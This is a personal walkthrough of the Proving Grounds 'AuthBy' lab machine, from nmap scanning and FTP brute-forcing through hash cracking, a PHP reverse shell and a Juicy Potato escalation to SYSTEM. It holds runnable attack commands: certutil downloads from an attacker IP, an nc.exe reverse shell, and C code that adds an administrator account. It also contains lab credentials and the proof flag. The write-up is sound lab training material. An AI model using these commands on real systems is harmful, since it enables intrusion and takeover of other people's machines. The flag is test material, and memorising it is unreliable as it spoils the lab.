Initial access creds 
```
apache / 1q2w3e4r5t6y7u
```

# NMAP 

```
sudo nmap -sC -sV 192.168.184.46 -oN nmap-authby
```

![[PG/Windows/attachments/Pasted image 20250702210835.png]]
- add LIVDA to `/etc/hosts`
all ports 
![[PG/Windows/attachments/Pasted image 20250702211551.png]]

# UDP Port Scan

export IP="192.168.184.46" > ~/.bashrc

```
sudo nmap -Pn -n $IP -sU --top-ports=100
```


# FTP

![[PG/Windows/attachments/Pasted image 20250702211008.png]]
better command 
```
wget -r ftp://Anonymous:pass@$IP
```
Going to recursively download accounts, log, certificates, and extensions

```
wget -r -l 0 ftp://anonymous:anonymous@192.168.184.46/accounts/*
```

![[PG/Windows/attachments/Pasted image 20250702211221.png]]
- nothing in accounts or log that we have permissions to view/download 

FTP with creds.. didn't work

# RDP 

```
xfreerdp3 /u:apache /p:1q2w3e4r5t6y7u /v:192.168.184.46
```

Issues
![[PG/Windows/attachments/Pasted image 20250702213045.png]]

# Port 242

Google how to connect to this and google said it depends what service it is so.. ran a service scan 

```
nmap -sV -sC -p 242 192.168.184.46 -oN two-nmap-scan
```

![[PG/Windows/attachments/Pasted image 20250702213835.png]]
- looks like I can access from web browser 

Here's a login! Enter given creds 
![[PG/Windows/attachments/Pasted image 20250702214046.png]]
![[PG/Windows/attachments/Pasted image 20250702214134.png]]
- shit. given creds no work.
- neither does admin:admin
# Port 3145

Also going to do a service scan

```
nmap -sV -sC -p 3145 192.168.184.46 -oN three-nmap-scan
```

![[PG/Windows/attachments/Pasted image 20250702214232.png]]
- ZFTPServer 👀

Googling FTP exploits for this version 

![[PG/Windows/attachments/Pasted image 20250702215733.png]]

https://www.exploit-db.com/exploits/18235

Not sure how deleting files will help me

Brute force FTP
```
sudo hydra -L names.txt -P '/usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt' -s 21 ftp://$IP
```

can login with admin:admin..

![[PG/Windows/attachments/Pasted image 20250703001129.png]]
Got creds from .htpasswd
![[PG/Windows/attachments/Pasted image 20250703001105.png]]
```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

Hashcat mode is 1600
![[PG/Windows/attachments/Pasted image 20250703001333.png]]

crack this 

# Hashcat
```
hashcat -m 1600 offsec.hash /usr/share/wordlists/rockyou.txt
```

cracked as `elite`

![[PG/Windows/attachments/Pasted image 20250703001624.png]]

# Website login?

Nope. This is the site.
![[PG/Windows/attachments/Pasted image 20250703001740.png]]

# RDP


```
xfreerdp3 /u:offsec /p:elite /v:192.168.184.46
```


return to ftp (admin:admin) and upload a suitable PHP reverse shell

https://www.revshells.com/

This one for Windows 

![[PG/Windows/attachments/Pasted image 20250703112207.png]]

Drop this shell on the box using ftp connection
![[PG/Windows/attachments/Pasted image 20250703113020.png]]

Make sure nc listener is running. 

Navigate to `http://192.168.208.46:242/winshell.php`

Enter `offsec:elite` creds to login.

Catch rev shell.

![[PG/Windows/attachments/Pasted image 20250703113204.png]]

Be careful to not immediately fuck up the shell because getting a new one doesn't work :) 

Clearing browser cache and trying again. Nope.

Had to revert box then could get another shell. annoying

Will return here after getting user flag. 

![[PG/Windows/attachments/Pasted image 20250703114111.png]]

# Enum filesystem 

Here is C: drive 
![[PG/Windows/attachments/Pasted image 20250703114256.png]]
- wamp, config, managengine seem interesting

Because this box is called authby..I think this may be a manageengine exploit. 

- Config.sys is nothing 

There's a lot of stuff in the ManageEngine folder including backups and archives dirs. need to figure out how to transfer to Kali to automate looking through. 

Backups look like sql database

![[PG/Windows/attachments/Pasted image 20250703114629.png]]

Looks like ServiceDesk is running on port 8080

![[PG/Windows/attachments/Pasted image 20250703114754.png]]

There is a mysql port listening but I don't see port 8080 

![[PG/Windows/attachments/Pasted image 20250703115128.png]]

Need to figure out how to look at these backups 

![[PG/Windows/attachments/Pasted image 20250703115239.png]]

Oh 👀

![[PG/Windows/attachments/Pasted image 20250703122712.png]]
- I have SeImpersonatePrivilege

# Which Potato to Use...

Check which Windows version 
```
systeminfo
```

![[PG/Windows/attachments/Pasted image 20250703123028.png]]
- Microsoft Windows Server 2008 Standard

Hot Potato may be a match :( - it was juicy potato

https://jlajara.gitlab.io/Potatoes_Windows_Privesc

Transfer Potato.exe using FTP again.

Find the Potato. 

```
dir Potato* /S
```

![[PG/Windows/attachments/Pasted image 20250703125018.png]]
- in C:\wampp\www

Construct Potato command to add the apache user to administrator group. 

Oh naur :( 

![[PG/Windows/attachments/Pasted image 20250703125303.png]]

Giving up on potato.

# Check for Unquoted Service Paths

```

```

![[PG/Windows/attachments/Pasted image 20250703134613.png]]

- There are two..

Let's try to exploit the wamp one because that's not a default Windows installation location. 

I can write to this directory

![[PG/Windows/attachments/Pasted image 20250703135416.png]]

So going to add a binary that adds me as an admin.

Compile executable to add an admin user 'cadet' to administrators group 

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user cadet password123! /add");
  i = system ("net localgroup administrators cadet /add");
  
  return 0;
}

```

```
x86_64-w64-mingw32-gcc adduser.c -o mysql.exe
```

Pop it into this folder
![[PG/Windows/attachments/Pasted image 20250703140550.png]]

Then we may have to reboot the box and lose our connection .. 

```
shutdown /r
```

Shit 

![[PG/Windows/attachments/Pasted image 20250703144433.png]]


# Juicy Potato THEN

```
certutil -urlcache -split -f http://192.168.45.152:8888/Juicy.Potato.x86.exe
```

Need to test different CLSIDs to see what will work with the juicy executable
https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.list


Here's the command 

```
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c <CLSID HERE>
```

I'll Try this 

```
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```

Oh snerp!

This worked!

![[PG/Windows/attachments/Pasted image 20250703214100.png]]

# Reverse Shell Through Juicy Potato

Upload a nc.exe binary. 
```
certutil -urlcache -split -f http://192.168.45.152:8881/nc.exe
```

Set up nc listener on port 242 to catch shell

```
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe 192.168.45.152 242" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```

This executes successfully 

![[PG/Windows/attachments/Pasted image 20250703214842.png]]

Annnd I got system shell :D 

![[PG/Windows/attachments/Pasted image 20250703214912.png]]

And the proof
a39113f5f2f2810bb563fc089caa64fb


TY: https://medium.com/@Dpsypher/proving-grounds-practice-authby-96e74b36375a
